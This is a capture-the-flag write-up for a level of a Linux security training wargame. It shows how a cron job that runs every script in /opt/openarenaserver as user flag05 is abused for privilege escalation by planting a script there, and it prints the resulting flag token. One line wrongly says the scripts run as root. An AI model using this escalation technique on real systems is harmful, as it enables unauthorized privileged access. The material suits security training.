# LEVEL 05
We log in directly as level05 and we see that we have receive a mail:
```
>$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
User flag05 seems to inform us that he set up a cron job to run every 2 minutes.
Lets have a look at the script permissions:
```
>$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
````
We see this script is run with user **flag05 permissions**. Unfortunately we **don't have** permission to **edit** this file (and have it call getflag).
So lets investigate what this script does:
```
>$ cat /usr/sbin/openarenaserver
#!/bin/sh
	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i") 
		rm -f "$i"
	done
```


**ulimit -t 5**	 	:: `limit the maximum amount of cpu time in 5 seconds`
**bash -x "$i"**	:: `print the file to stdout before executing it`
**rm -f "\$i"**		:: `remove the file`

We can see that it will loop through all the files in `/opt/openarenaserver` and run them in a bash shell before deleting them.  
We need to create a **bash script** in that directory, to have it run as **root**.

Since the operaneserver script does not return or print the output of the command, we will have to make sure the output is redirected to a file in `/tmp`:
```
>$ echo "getflag > /tmp/token" > /tmp/getflag.sh
>$ mv /tmp/getflag.sh /opt/openarenaserver/getflag.sh
```
Wait some time and:
```
>$ cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

#### Vulnerability:
Cron job running untrusted source scripts as privileged user -> Privilege escalation via cron

#### Documentations:
* https://www.digitalocean.com/community/questions/how-to-manage-var-mail-root-file
* https://www.hostinger.fr/tutoriels/cron-job/
* https://superuser.com/questions/306163/what-is-the-you-have-new-mail-message-in-linux-unix
* https://www.liquidweb.com/kb/how-to-display-list-all-jobs-in-cron-crontab/
* https://www.freeformatter.com/cron-expression-generator-quartz.html
* http://manpagesfr.free.fr/man/man1/bash.1.html
* https://ss64.com/bash/ulimit.html
* https://www.cyberciti.biz/faq/linux-show-what-cron-jobs-are-setup/
* https://unix.stackexchange.com/questions/119598/as-root-how-can-i-list-the-crontabs-for-all-users
* https://crontab.guru/every-2-minutes
* http://www.linux-france.org/article/man-fr/man1/su-1.html